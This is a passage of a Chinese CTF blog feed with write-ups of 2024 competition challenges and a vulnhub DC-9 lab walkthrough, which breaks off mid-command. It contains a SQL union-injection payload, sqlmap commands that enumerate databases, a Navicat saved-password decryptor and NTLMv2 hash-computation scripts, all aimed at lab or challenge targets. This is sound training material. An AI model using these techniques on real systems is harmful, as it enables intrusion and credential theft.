title="网站数据绝对安全1"></a>网站数据绝对安全1</h3><p>系统中存在的用户名是什么？</p><p>多亏后面补充了提交次数 一个个试都试出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333537.png" alt="img"></p><h3 id="网站数据绝对安全2"><a href="#网站数据绝对安全2" class="headerlink" title="网站数据绝对安全2"></a>网站数据绝对安全2</h3><p>key3的的值是什么？</p><p>在http导出中提取出来一个safe.html</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333354.png" alt="img"></p><p>但是使用浏览器打开是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333336.png" alt="img"></p><p>发现直接复制不行 手动输入可以 </p><p>后面看了一下源码 大概率是和这个字体有关系</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333523.png" alt="img"></p><h3 id="Bitcoin1-赛后复盘"><a href="#Bitcoin1-赛后复盘" class="headerlink" title="Bitcoin1(赛后复盘)"></a>Bitcoin1(赛后复盘)</h3><p>附件拿到的是一个Computer.ad1镜像文件 使用FTK Imager可以进行挂载 </p><p>挂载的过程实在是太难受了 4.5版本的死活挂不上 后面用4.2的才挂上</p><p>在挂载的时候 一定要注意 先选择<code>Add Evidence Item</code> 将镜像添加为证据项</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317656.png" alt="image-20240430204309975"></p><p>在添加的证据项出选择挂载镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317991.png" alt="image-20240430204327332"></p><p>成功挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317535.png" alt="image-20240430204342877"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317970.png" alt="image-20240430204352382"></p><p>挂载好后使用火眼分析磁盘中的文件夹 选择添加文件集合检材 在ShimCache中可以看到一个比特币钱包的安装程序的最后修改时间 那这个应该就是 <code>2022-01-05 10:21:16</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317174.png" alt="image-20240430214903734"></p><h3 id="Bitcoin2-赛后复盘"><a href="#Bitcoin2-赛后复盘" class="headerlink" title="Bitcoin2(赛后复盘)"></a>Bitcoin2(赛后复盘)</h3><p>打开powershell 使用findwallet这个工具来查找加密比特币钱包文件</p><pre><code>安装npm install findwallet -g使用findwallet -i [inputPath/inputFile] -o [outputFile] -i     : Required. Specify which path(s) to scan directly or through a newline separated file. -o     : Specify optional output file where to store wallet paths if any exist. -h     : Displays this message.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317366.png" alt="image-20240430212918786"></p><p>在前面加上盘符</p><pre><code>C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead.sys</code></pre><h3 id="Bitcoin3-赛后复盘"><a href="#Bitcoin3-赛后复盘" class="headerlink" title="Bitcoin3(赛后复盘)"></a>Bitcoin3(赛后复盘)</h3><p>在<code>Users\Daddy\Downloads</code>文件夹下发现了bitcoin钱包程序的安装包<code>bitcoin-22.0-win64-setup.exe</code> 导出安装一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317048.png" alt="image-20240430213504602"></p><p>打开之后新建一个钱包<code>test</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317344.png" alt="image-20240430213711950"></p><p>将上面bitcoin2导出的钱包文件替换掉<code>Bitcoin\bitcoin\wallets\test\wallet.dat</code>   注意要将上面找到的<code>AppContainerUserCertRead.sys</code> 改名为<code>wallet.dat</code>  再次重启软件 直接点隐藏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302318825.png" alt="image-20240430214548135"></p><p>点击交易记录  第二条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151660.png" alt="image-20240502215102589"></p><p>找到钱包地址</p><pre><code>bc1qf3lta6zr9k4kt9q25sz47vdcnn73zyzk0m5gvz</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151670.png" alt="image-20240502215119629"></p><h3 id="Bitcoin4"><a href="#Bitcoin4" class="headerlink" title="Bitcoin4"></a>Bitcoin4</h3><p>在合约CTF.sol中存在一处漏洞，该漏洞是由哪一函数造成的(比如:exec)？</p><p>gpt做题法 算是非预期解 直接喂合约的完整代码进行分析 </p><pre><code class="Bash">在这个合约文件中存在一处漏洞，由transferFrom函数造成。具体来说，这个漏洞出现在以下代码段：solidityCopy codefunction transferFrom(address from, address to, uint256 value) public notFrozen(from) returns (bool) &#123;    require(msg.sender == owner);    return super.transferFrom(from, to, value);&#125;在这段代码中，漏洞是由于require语句的条件不够严格导致的。当前的transferFrom函数实现要求调用者必须是owner，但是并没有检查调用者是否具有足够的授权来执行转账操作。因此，任何拥有owner权限的地址都可以调用transferFrom函数，而无需经过持有者的授权。</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数信杯&quot;&gt;&lt;a href=&quot;#2024数信杯&quot; class=&quot;headerlink&quot; title=&quot;2024数信杯&quot;&gt;&lt;/a&gt;2024数信杯&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/w3nx1z</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024数字中国</title>
    <link href="http://w3nx1z1.github.io/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/"/>
    <id>http://w3nx1z1.github.io/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/</id>
    <published>2024-04-29T15:07:14.050Z</published>
    <updated>2024-04-29T15:07:41.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数字中国"><a href="#2024数字中国" class="headerlink" title="2024数字中国"></a>2024数字中国</h1><p>被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281639162.png" alt="image-20240428163912024"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292306992.png" alt="image-20240429230609921"></p><h2 id="重要的System32"><a href="#重要的System32" class="headerlink" title="重要的System32"></a>重要的System32</h2><pre><code>小明把自己的System32文件分享出去了，不小心泄露了重要数据（虚拟机做好快照后，在虚拟机中分析；flag的提交格式为 flag&#123;uuid&#125; ）三个部分的flag关注 注册表、winevt\Logs、OBJECTS.DATA</code></pre><p>就按照给的提示 从注册表 winevt\Logs文件夹中 OBJECTS.DATA文件中搜有相关flag的字段就好 考验一个眼力(bushi)</p><p>第二部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225295.png" alt="image-20240429210313730"></p><pre><code>-834f-f797</code></pre><p>第一部分 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225572.png" alt="image-20240429210707535"></p><pre><code>&#123;ef63fcbc-3467</code></pre><p>第三部分 翻注册表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225389.png" alt="image-20240429211545409"></p><p>找到一个Pwd 还有flag文件路径是<code>C:\\Users\\Administrator\\Documents\\Navicat\\MySQL\\Servers\\f1a4_3</code> 看起来是让我们破解Navicat连接的密码 找个php代码</p><pre><code class="php">&lt;?phpclass NavicatPassword&#123;    protected $version = 0;    protected $aesKey = &#39;libcckeylibcckey&#39;;    protected $aesIv = &#39;libcciv libcciv &#39;;    protected $blowString = &#39;3DC5CA39&#39;;    protected $blowKey = null;    protected $blowIv = null;         public function __construct($version = 12)    &#123;        $this-&gt;version = $version;        $this-&gt;blowKey = sha1(&#39;3DC5CA39&#39;, true);        $this-&gt;blowIv = hex2bin(&#39;d9c7c3c8870d64bd&#39;);    &#125;         public function encrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;encryptEleven($string);                break;            case 12:                $result = $this-&gt;encryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function encryptEleven($string)    &#123;        $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector));            $currentVector = $this-&gt;xorBytes($currentVector, $temp);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return strtoupper(bin2hex($result));    &#125;         protected function encryptBlock($block)    &#123;        return openssl_encrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function decryptBlock($block)    &#123;        return openssl_decrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function xorBytes($str1, $str2)    &#123;        $result = &#39;&#39;;        for ($i = 0; $i &lt; strlen($str1); $i++) &#123;            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));        &#125;                 return $result;    &#125;         protected function encryptTwelve($string)    &#123;        $result = openssl_encrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);        return strtoupper(bin2hex($result));    &#125;         public function decrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;decryptEleven($string);                break;            case 12:                $result = $this-&gt;decryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function decryptEleven($upperString)    &#123;        $string = hex2bin(strtolower($upperString));                 $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $encryptedBlock = substr($string, 8 * $i, 8);            $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector);            $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return $result;    &#125;         protected function decryptTwelve($upperString)    &#123;        $string = hex2bin(strtolower($upperString));        return openssl_decrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);    &#125;&#125;;  //需要指定版本两种，11或12//$navicatPassword = new NavicatPassword(11);$navicatPassword = new NavicatPassword(11); //解密//$decode = $navicatPassword-&gt;decrypt(&#39;15057D7BA390&#39;);$decode = $navicatPassword-&gt;decrypt(&#39;FB916DAFA4CE92143350DCF66AE9&#39;); // navicat密钥echo $decode.&quot;\n&quot;;?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226757.png" alt="image-20240429212426207"></p><p>拿到第三部分</p><pre><code>-185817e5f846&#125;</code></pre><p>合起来</p><pre><code>flag&#123;ef63fcbc-3467-834f-f797-185817e5f846&#125;</code></pre><h2 id="Strangesystem-NTLMv2哈希计算"><a href="#Strangesystem-NTLMv2哈希计算" class="headerlink" title="Strangesystem(NTLMv2哈希计算)"></a>Strangesystem(NTLMv2哈希计算)</h2><pre><code>你是一名安全防护人员，你发现有人成功入侵了公司的服务器，你查找有关的流量设备，发现了一个流量包文件，你认为它可能包含了一些重要的信息。但是当你打开它时，你发现它被加密了：你觉得这个文件可能被某种奇怪的系统加密过，你想要找出加密算法并解密出文件内容。</code></pre><p>拿到一个流量 先看http导出 有张<code>q.png</code> 直接导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226598.png" alt="image-20240429153504477"></p><p>使用010打开 发现尾部存在压缩包 导出并保存 压缩包真加密存在解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226165.png" alt="image-20240429153736350"></p><p>看到压缩包尾部也存在额外信息 先留着 回来看流量包 QUIC协议的流量包存在加密 搜一下解密方法</p><p><a href="https://blog.csdn.net/qq_37177958/article/details/120476794">Wireshark对QUIC包的抓包和解包</a></p><p>简单来说 就是使用在抓包时获得的关于TLS握手信息的密钥日志文件 在wireshark编辑——首选项——Protocols——TLS 中将日志文件添加进(Pre)-Master-Secret   Log filename中就可以进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226671.png" alt="image-20240429155157374"></p><p>这个日志密钥文件 就是我们上面在压缩包后面发现的内容 将这部分信息另存为<code>sshkey.log</code>文件 放入上面提到的位置 就可以进行解密</p><pre><code>SERVER_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 82ec3ebf3131b2442d165bb00dd6b8d1a6b4c866daf3fd373c22d33886290ed2868a7395e691980b990de46b76a54f9eCLIENT_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 10965df426257a285c6e812ed54468c59437e77bceff2c3a6d633dacefadf8188e97c4935df6815e5398b24273addc79SERVER_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a cdbf7c7a161af7aa829b14becaa2c000b8183000983e06589fef0c50e9462cf71aeb487e1cb1defaef06a941234ea7a2CLIENT_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a e58e4088a7840d3991ac2336c581d2a35edbebfd14420a29c287444c3631dc98038b71f1d153cd37ba46164145a028fd</code></pre><p>解密之后追踪QUIC流 可以看到一组账密和一个html网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226193.png" alt="image-20240429155557247"></p><p>网页文件中的内容是</p><pre><code>admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000</code></pre><p>中间未知的部分是NETntlmv2的值 我们可以通过前面的一组账密和已知的ntlm值得到NETntlmv2的值 在此之前 我们先一起来学习一些概念 下面我是参考学习的文章</p><p><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></p><p><a href="https://en.wikipedia.org/wiki/NTLM">NTML</a></p><p><a href="https://medium.com/@notahades/what-is-ntlmv2-31153aa3102c">什么是NTMLv2</a></p><p><a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a></p><pre><code>NTLM 是一种质询-响应身份验证协议 NTLM 协议使用两个散列密码值中的一个或两个，这两个值也存储在服务器（或域控制器）上，并且通过缺少加盐，它们是等效的密码，这意味着如果您从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。这两个是LM 哈希（基于DES 的函数，应用于将密码的前 14 个字符转换为该语言的传统 8 位 PC 字符集）和 NT 哈希（小端UTF-16 Unicode密码的MD4 ） ）。两个哈希值均为 16 字节（128 位）。NTLM 协议还使用两个单向函数之一，具体取决于 NTLM 版本； NT LanMan 和 NTLM 版本 1 使用基于 DES 的 LanMan 单向功能 (LMOWF)，而 NTLMv2 使用基于 NT MD4的单向功能 (NTOWF)   这个MD4的加密方法后面也会提到</code></pre><pre><code>NTLM hash通常是指Windows系统下Security Account Manager中保存的用户密码hash该hash的生成方法：将明文口令转换成十六进制的格式转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位的十六进制数字串</code></pre><pre><code>NTLMv2（NT LAN Manager 版本 2） 也是一种质询-响应身份验证协议 NTLMv2 发送两个对 8 字节服务器质询的响应。每个响应包含服务器质询的16 字节HMAC - MD5哈希值、完全/部分随机生成的客户端质询以及用户密码和其他标识信息的 HMAC-MD5 哈希值。NTLMv2的主要功能：1.身份验证协议 2.质询-响应机制 3.散列和加密 NTLMv2 依赖加密技术来保护身份验证数据。它使用 HMAC-MD5（具有 MD5 哈希函数的基于哈希的消息身份验证代码）进行完整性检查，并使用 MD4进行加密。4.增强的安全性5.兼容性 NTLMv2也向后兼容NTML协议6.域身份验证</code></pre><pre><code>NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：1.客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash2.服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge13.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器4.服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功在以上流程中，登录用户的密码hash即NTLM hash，response中包含Net-NTLM hash这上面提到的NTLM包括NTLMv1 NTLMv2 NTLM sessionV2三种协议 不同协议使用不同格式的challenge和加密算法 因此也就区分出了NETntlmv1 hash和NETntlmv2 hashNTLMv2的格式是username::domain:challenge:HMAC-MD5:blob其中domain是IP或者机器名challenge是上面提到的服务器收到请求之后生成的随机数 体现在流量包中是NTLM Server ChallengeHMAC-MD5在流量包中体现为NTProofstrblob是上面提到的使用用户登陆的密码对challenge进行加密之后的challenge1(即response)的值去掉NTProofstr的部分</code></pre><p>那么对照上面说的NTLMv2的格式 我们这个题中<code>xxx</code>的部分很明显就是缺少了HMAC-MD5部分的值  好在我们有用户admin的登陆密码 可以计算出这部分缺失的值 同时计算出该用户的NTLMv2 hash值</p><p>下面是计算流程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226818.png" alt="image-20240429170531714"></p><p>计算方法参考<a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a>  我们使用python2和python3两个版本来实现这个计算过程</p><pre><code class="python"># python2# python2import hashlibimport binasciiimport hmacinput_ntml = raw_input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;,input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)input_user = raw_input(&quot;please input username:&quot;)input_domain = raw_input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = input_user_and_domain.upper().encode(&quot;utf-16-le&quot;).encode(&quot;hex&quot;)firstHMAC = hmac.new(ntlm.decode(&quot;hex&quot;), encode_user_and_domain.decode(&quot;hex&quot;), hashlib.md5).hexdigest()input_challange = raw_input(&quot;please input challenge:&quot;)input_blob = raw_input(&quot;please input blob:&quot;)type2challenge = input_challange + input_blobntlmv2 = hmac.new(firstHMAC.decode(&quot;hex&quot;), type2challenge.decode(&quot;hex&quot;), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot;+ ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226464.png" alt="image-20240429174403973"></p><pre><code class="python"># python3import hashlibimport binasciiimport hmac# 计算密码的ntlm hash值input_ntml = input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;, input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)# 计算用户名和域名的编码值input_user = input(&quot;please input username:&quot;)input_domain = input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = binascii.hexlify(input_user_and_domain.upper().encode(&quot;utf-16-le&quot;))# 计算HMAC-hash值firstHMAC = hmac.new(binascii.unhexlify(ntlm), binascii.unhexlify(encode_user_and_domain), hashlib.md5).hexdigest()# 计算NTLMv2 hash值input_challenge = input(&quot;please input challenge:&quot;)input_blob = input(&quot;please input blob:&quot;)type2challenge = input_challenge + input_blobntlmv2 = hmac.new(binascii.unhexlify(firstHMAC), binascii.unhexlify(type2challenge.encode()), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot; + ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226056.png" alt="image-20240429174433304"></p><p>最终算出admin用户的NTLMv2哈希值为<code>efa243f442b9d683eb1b00a2b1a0c9fc</code></p><p>使用这个值就可以解压压缩包 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226647.png" alt="image-20240429174554406"></p><h2 id="Wireshark2-1"><a href="#Wireshark2-1" class="headerlink" title="Wireshark2.1"></a>Wireshark2.1</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281640078.png" alt="image-20240428164034035"></p><p>很显然是theanswerishere.php</p><h2 id="Wireshark2-2"><a href="#Wireshark2-2" class="headerlink" title="Wireshark2.2"></a>Wireshark2.2</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281643179.png" alt="image-20240428164317144"></p><p>刚开始写的2 错误 输入3 对了</p><h2 id="Wireshark2-3"><a href="#Wireshark2-3" class="headerlink" title="Wireshark2.3"></a>Wireshark2.3</h2><pre><code>id=0%27%20union%20select%201,2,group_concat(th1sfI4g)%20from%20fl4g--+</code></pre><p>这句查询语句</p><p>很明显列名是th1sfI4g</p><h2 id="Wireshark2-4"><a href="#Wireshark2-4" class="headerlink" title="Wireshark2.4"></a>Wireshark2.4</h2><p>在最后一行直接追踪http流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281645495.png" alt="image-20240428164531407"></p><h2 id="WeirdUSB-1"><a href="#WeirdUSB-1" class="headerlink" title="WeirdUSB.1"></a>WeirdUSB.1</h2><p>使用取证大师分析 问下载 直接搜download</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281648437.png" alt="image-20240428164854359"></p><p>合并显示 发现目标文件名</p><pre><code>212633.crdownload</code></pre><h2 id="WeirdUSB-2"><a href="#WeirdUSB-2" class="headerlink" title="WeirdUSB.2"></a>WeirdUSB.2</h2><p>发现Area2&#x2F;Job2目录下的docx文件是唯一一个访问时间和修改时间相同的</p><p>猜测是该目录下的txt文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658734.png" alt="image-20240428165840676"></p><h2 id="fake-php"><a href="#fake-php" class="headerlink" title="fake_php"></a>fake_php</h2><p>随便输入一些 抓个包 看到要crc32校验</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281653267.png" alt="image-20240428165332188"></p><p>写个脚本进行爆破</p><pre><code class="python">import itertoolsimport zlib# 要匹配的CRC32校验值target_crc32 = 0xb4a5bb5a# 可能的字符集：大小写字母和数字chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#@!%$^&amp;*&#39;# 使用itertools.product生成所有可能的四位字符组合for combo in itertools.product(chars, repeat=4):    # 将字符元组转换为字符串    four_letter_combo = &#39;&#39;.join(combo) + &#39;-/flag&#39;    # 计算拼接字符串的CRC32校验值    crc32_result = zlib.crc32(four_letter_combo.encode(&#39;utf-8&#39;)) &amp; 0xffffffff    # 检查校验值是否与目标匹配    if crc32_result == target_crc32:        # 如果找到匹配，打印结果并停止        print(f&quot;Found matching string: &#123;four_letter_combo&#125;&quot;)        breakelse:    print(&quot;No matching string found.&quot;)</code></pre><p>爆到了S!@#</p><p>写入admin.php 抓包输入上面密码的url密码 得到adminS3cr3t.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281657577.png" alt="image-20240428165730488"></p><p>访问</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658968.png" alt="image-20240428165803920"></p><p>下面参照</p><p><a href="https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin">https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin</a></p><p>存在一个sql绕过 直接打poc 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658353.png" alt="image-20240428165822285"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数字中国&quot;&gt;&lt;a href=&quot;#2024数字中国&quot; class=&quot;headerlink&quot; title=&quot;2024数字中国&quot;&gt;&lt;/a&gt;2024数字中国&lt;/h1&gt;&lt;p&gt;被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一&lt;/p&gt;
&lt;p&gt;&lt;img src</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-9</title>
    <link href="http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/"/>
    <id>http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/</id>
    <published>2024-04-13T13:40:27.748Z</published>
    <updated>2024-04-17T06:46:12.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-9"><a href="#vulnhub靶场DC-9" class="headerlink" title="vulnhub靶场DC-9"></a>vulnhub靶场DC-9</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这次靶场描述没有给到什么信息</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132128103.png" alt="image-20240413212816063"></p><p>靶场ip为<code>192.168.204.138</code></p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.138</code></pre><p>只开放了tcp服务 80端口 使用Apache中间件 版本2.4.38</p><p>ssh服务此时显示的是filtered 被过滤了 这里是一个伏笔</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151949734.png" alt="image-20240415194924702"></p><p>再来扫一下指纹信息</p><pre><code>whatweb -v http://192.168.204.138/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132133436.png" alt="image-20240413213315387"></p><p>扫一下目录 </p><pre><code>python3 dirsearch.py -u http://192.168.204.138/ -i 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132137726.png" alt="image-20240413213735695"></p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151108793.png" alt="image-20240415110806734"></p><p>发现两个可能存在问题的页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130487.png" alt="image-20240415113001414"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130693.png" alt="image-20240415113006626"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>直接用xray扫一遍 </p><pre><code>.\xray_windows_amd64.exe webscan --basic-crawler http://192.168.204.138/ --html-output out.html</code></pre><p>查看out.html 看来是results.php页面存在sql注入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151150014.png" alt="image-20240415115022932"></p><p>直接上sqlmap</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; --dbs --level=5</code></pre><p>要写<code>--date &quot;search=123456&quot;</code> 参数是因为我们在search.php页面搜索框输入内容之后 会直接跳转到results.php 使用POST方法传入一个<code>search</code>参数</p><p>有三个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151509572.png" alt="image-20240415150917512"></p><p>先爆users数据库的表</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data 